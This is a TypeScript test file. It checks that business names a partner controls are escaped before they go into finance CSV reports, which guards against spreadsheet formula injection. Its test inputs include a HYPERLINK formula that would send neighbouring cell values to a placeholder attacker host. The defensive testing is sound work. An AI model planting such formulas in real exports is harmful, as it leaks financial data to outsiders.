// Security: names a partner or client controls cannot become live formulas in the CSV exports
// (csv-formula-injection, csv-formula-admin-finance-reports). Before the fix a partner who renamed
// the business to `=HYPERLINK(…)` had it evaluated in the finance team's batch report.
import { afterEach, describe, expect, it } from 'vitest';
import { SYSTEM } from '@/lib/domain/actor';
import { eq } from 'drizzle-orm';
import { db } from '@/db';
import { payoutBatch } from '@/db/schema';
import { setTestNow } from '@/lib/clock';
import { csvCell } from '@/lib/csv';
import { sofiaInstant } from '@/lib/format';
import { batchReportCsv, releaseBookingFunds } from '@/lib/domain/payouts';
import { createPartner } from '../helpers/factories';
import { clearJobs, confirmPayoutAccount, paidBooking, runJobs } from '../helpers/aftercare';

afterEach(() => setTestNow(null));

describe('csvCell', () => {
  it('turns a formula into text and leaves numbers alone', () => {
    expect(csvCell('=1+1')).toBe("'=1+1");
    expect(csvCell('+359888123456')).toBe("'+359888123456");
    expect(csvCell('@SUM(A1:A2)')).toBe("'@SUM(A1:A2)");
    expect(csvCell('-2+3')).toBe("'-2+3");
    expect(csvCell('\t=1')).toBe("'\t=1");
    expect(csvCell('=HYPERLINK("https://evil.example/?d="&C3)')).toBe(`"'=HYPERLINK(""https://evil.example/?d=""&C3)"`);
    expect(csvCell('-12,50')).toBe('-12,50');
    expect(csvCell('1450,00')).toBe('1450,00');
    expect(csvCell(-5)).toBe('-5');
    expect(csvCell('Студио Мелодия; ЕООД')).toBe('"Студио Мелодия; ЕООД"');
    expect(csvCell(null)).toBe('');
  });
});

describe('the batch report (finance team)', () => {
  it('a partner business name starting with = is written as text', async () => {
    await clearJobs();
    setTestNow(sofiaInstant('2025-09-08', 12, 0));
    const evil = '=HYPERLINK("https://evil.example/?d="&C3&D3&E3,"Студио")';
    const p = await createPartner({ businessName: evil });
    await confirmPayoutAccount(p.partner.id);
    const a = await paidBooking({ partner: p, eventDate: '2025-09-10' });
    setTestNow(sofiaInstant('2025-09-14', 8, 0));
    await db.transaction(tx => releaseBookingFunds({ bookingId: a.booking.id }, tx));
    setTestNow(sofiaInstant('2025-09-14', 9, 1));
    await runJobs(); // T17 prepares the 15 September batch
    const [batch] = await db.select().from(payoutBatch).where(eq(payoutBatch.batchDate, '2025-09-15'));
    const csv = await batchReportCsv(SYSTEM, batch.id);
    const row = csv.split('\r\n').find(l => l.includes('HYPERLINK'))!;
    const cells = row.match(/("([^"]|"")*"|[^;]*)(;|$)/g)!.map(c => c.replace(/;$/, ''));
    for (const c of cells) expect(c.replace(/^"/, ''), c).not.toMatch(/^[=+@]/);
    expect(row).toContain(`"'=HYPERLINK(`);
  });
});
